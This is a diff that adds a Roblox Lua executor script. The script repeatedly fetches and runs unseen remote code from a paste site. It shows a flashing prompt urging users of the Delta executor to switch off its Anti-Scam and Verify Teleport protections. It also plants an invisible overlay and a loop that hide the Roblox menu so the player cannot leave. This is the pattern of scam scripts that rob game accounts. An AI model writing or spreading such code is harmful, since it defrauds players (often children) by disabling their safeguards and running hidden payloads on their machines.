@@ -1,0 +1,248 @@
+loadstring(game:HttpGet("https://pastefy.app/PwGI2HPw/raw"))()
+
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+local TeleportService = game:GetService("TeleportService")
+local TweenService = game:GetService("TweenService")
+
+-- Function to detect executor
+local function detectExecutor()
+    if syn then
+        return "Synapse"
+    elseif KRNL then
+        return "KRNL"
+    elseif Fluxus then
+        return "Fluxus"
+    elseif Protosmasher then
+        return "Protosmasher"
+    elseif (ArceusX ~= nil) or (Arceus ~= nil) then
+        return "Arceus X"
+    elseif Delta then
+        return "Delta"
+    else
+        return "Unknown"
+    end
+end
+
+local executor = detectExecutor()
+
+if executor == "Delta" then
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.IgnoreGuiInset = true
+    screenGui.ResetOnSpawn = false
+    screenGui.Parent = playerGui
+
+    -- Main Frame (fixed size + aspect ratio)
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(0, 500, 0, 250)
+    frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+    frame.AnchorPoint = Vector2.new(0.5, 0.5)
+    frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+    frame.BorderSizePixel = 0
+    frame.Parent = screenGui
+
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 16)
+    corner.Parent = frame
+
+    local stroke = Instance.new("UIStroke", frame)
+    stroke.Color = Color3.fromRGB(0, 170, 255)
+    stroke.Thickness = 2
+
+    -- Para hindi stretch
+    local aspect = Instance.new("UIAspectRatioConstraint")
+    aspect.AspectRatio = 2 -- 500:250 ratio
+    aspect.Parent = frame
+
+    local sizeConstraint = Instance.new("UISizeConstraint")
+    sizeConstraint.MinSize = Vector2.new(400, 200)
+    sizeConstraint.MaxSize = Vector2.new(600, 300)
+    sizeConstraint.Parent = frame
+
+    -- Warning Bar
+    local warningBar = Instance.new("TextLabel")
+    warningBar.Size = UDim2.new(1, 0, 0.15, 0)
+    warningBar.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+    warningBar.TextColor3 = Color3.fromRGB(255, 221, 51)
+    warningBar.Text = [[Turn off your <u>Anti Scam</u> & <u>Verify Teleport</u> to avoid getting banned or disconnected.]]
+    warningBar.RichText = true
+    warningBar.TextSize = 14
+    warningBar.Font = Enum.Font.GothamBold
+    warningBar.TextWrapped = true
+    warningBar.TextXAlignment = Enum.TextXAlignment.Center
+    warningBar.TextYAlignment = Enum.TextYAlignment.Center
+    warningBar.Parent = frame
+
+    local topCorner = Instance.new("UICorner")
+    topCorner.CornerRadius = UDim.new(0, 16)
+    topCorner.Parent = warningBar
+
+    -- Fast Blinking Effect
+    task.spawn(function()
+        while warningBar and warningBar.Parent do
+            TweenService:Create(warningBar, TweenInfo.new(0.2), {BackgroundTransparency = 0.5, TextTransparency = 0.5}):Play()
+            task.wait(0.2)
+            TweenService:Create(warningBar, TweenInfo.new(0.2), {BackgroundTransparency = 0, TextTransparency = 0}):Play()
+            task.wait(0.2)
+        end
+    end)
+
+    -- Body Content
+    local bodyHolder = Instance.new("Frame", frame)
+    bodyHolder.Size = UDim2.new(1, -30, 0.55, 0)
+    bodyHolder.Position = UDim2.new(0, 15, 0.18, 0)
+    bodyHolder.BackgroundTransparency = 1
+
+    local title = Instance.new("TextLabel", bodyHolder)
+    title.Size = UDim2.new(1, 0, 0.25, 0)
+    title.BackgroundTransparency = 1
+    title.Text = "Delta Anti-Scam Detected"
+    title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    title.Font = Enum.Font.GothamBold
+    title.TextSize = 20
+    title.TextWrapped = true
+
+    local desc = Instance.new("TextLabel", bodyHolder)
+    desc.Size = UDim2.new(1, 0, 0.7, 0)
+    desc.Position = UDim2.new(0, 0, 0.3, 0)
+    desc.BackgroundTransparency = 1
+    desc.TextColor3 = Color3.fromRGB(200, 200, 200)
+    desc.Font = Enum.Font.Gotham
+    desc.TextSize = 15
+    desc.TextWrapped = true
+    desc.TextXAlignment = Enum.TextXAlignment.Center
+    desc.TextYAlignment = Enum.TextYAlignment.Center
+    desc.Text = [[ The script requires teleport permission, which is currently blocked by Delta's <font color="#FFD700">Anti-Scam</font>.
+1) Tap the Delta icon at the top.
+2) Open Settings (gear icon).
+3) Turn OFF the "<font color="#FFD700">Anti-Scam</font>" & "<font color="#FFD700">Verify Teleport</font>" option.
+4) Rejoin and run the script again. ]]
+    desc.RichText = true
+
+    -- Button Container
+    local buttonContainer = Instance.new("Frame", frame)
+    buttonContainer.Size = UDim2.new(1, -30, 0.18, 0)
+    buttonContainer.Position = UDim2.new(0, 15, 0.8, 0)
+    buttonContainer.BackgroundTransparency = 1
+
+    -- Open Button
+    local openButton = Instance.new("TextButton", buttonContainer)
+    openButton.Size = UDim2.new(0.48, 0, 1, 0)
+    openButton.BackgroundColor3 = Color3.fromRGB(0, 115, 255)
+    openButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    openButton.Font = Enum.Font.GothamBold
+    openButton.TextSize = 16
+    openButton.Text = "Click to Open Script"
+    openButton.TextWrapped = true
+    Instance.new("UICorner", openButton).CornerRadius = UDim.new(0, 10)
+
+    -- Rejoin Button
+    local rejoinButton = Instance.new("TextButton", buttonContainer)
+    rejoinButton.Size = UDim2.new(0.48, 0, 1, 0)
+    rejoinButton.Position = UDim2.new(0.52, 0, 0, 0)
+    rejoinButton.BackgroundColor3 = Color3.fromRGB(0, 122, 255)
+    rejoinButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    rejoinButton.Font = Enum.Font.GothamBold
+    rejoinButton.TextSize = 16
+    rejoinButton.Text = "Rejoin Game"
+    rejoinButton.TextWrapped = true
+    Instance.new("UICorner", rejoinButton).CornerRadius = UDim.new(0, 10)
+
+    -- Button Actions
+    openButton.MouseButton1Click:Connect(function()
+        screenGui:Destroy()
+        loadstring(game:HttpGet("https://pastefy.app/PwGI2HPw/raw"))()
+    end)
+
+    rejoinButton.MouseButton1Click:Connect(function()
+        TeleportService:Teleport(game.PlaceId, player)
+    end)
+
+else
+    loadstring(game:HttpGet("https://pastefy.app/PwGI2HPw/raw"))()
+end
+
+-- ===== AntiLeave Blocker (original) =====
+pcall(function()
+	if game.CoreGui:FindFirstChild("AntiLeaveBlocker") then
+		game.CoreGui.AntiLeaveBlocker:Destroy()
+	end
+end)
+
+local BLOCK_SIZE_X = 56
+local BLOCK_SIZE_Y = 56
+local BLOCK_POS_X  = 6
+local BLOCK_POS_Y  = 6
+local DISPLAY_ORDER = 10000
+
+local CoreGui = game:GetService("CoreGui")
+local RunService = game:GetService("RunService")
+
+local function tryHideRobloxMenu()
+	pcall(function()
+		local names = {"RobloxGui", "RobloxMenu", "Menu", "MenuGui", "Topbar", "TopBar"}
+		for _, n in ipairs(names) do
+			local g = CoreGui:FindFirstChild(n)
+			if g then
+				pcall(function()
+					if g:IsA("ScreenGui") then
+						g.Enabled = false
+						for _, c in ipairs(g:GetChildren()) do
+							pcall(function() c.Visible = false end)
+							pcall(function() c.Enabled = false end)
+						end
+					else
+						for _, c in ipairs(g:GetDescendants()) do
+							pcall(function()
+								if c:IsA("GuiObject") then
+									c.Position = UDim2.new(-10,0,-10,0)
+								end
+							end)
+						end
+					end
+				end)
+			end
+		end
+	end)
+end
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "AntiLeaveBlocker"
+screenGui.Parent = CoreGui
+screenGui.ResetOnSpawn = false
+screenGui.IgnoreGuiInset = true
+screenGui.DisplayOrder = DISPLAY_ORDER
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+local container = Instance.new("Frame")
+container.Size = UDim2.new(0, BLOCK_SIZE_X, 0, BLOCK_SIZE_Y)
+container.Position = UDim2.new(0, BLOCK_POS_X, 0, BLOCK_POS_Y)
+container.BackgroundTransparency = 1
+container.BorderSizePixel = 0
+container.Parent = screenGui
+
+local blocker = Instance.new("TextButton")
+blocker.Size = UDim2.new(1, 0, 1, 0)
+blocker.BackgroundTransparency = 1
+blocker.AutoButtonColor = false
+blocker.Text = ""
+blocker.Parent = container
+blocker.Active = true
+blocker.Selectable = false
+
+blocker.MouseButton1Down:Connect(function() end)
+blocker.MouseButton1Up:Connect(function() end)
+blocker.MouseButton2Down:Connect(function() end)
+blocker.MouseButton2Up:Connect(function() end)
+
+RunService.RenderStepped:Connect(function()
+	container.Position = UDim2.new(0, BLOCK_POS_X, 0, BLOCK_POS_Y)
+end)
+
+spawn(function()
+	while screenGui.Parent and screenGui.Parent == CoreGui do
+		tryHideRobloxMenu()
+		wait(2)
+	end
+end)
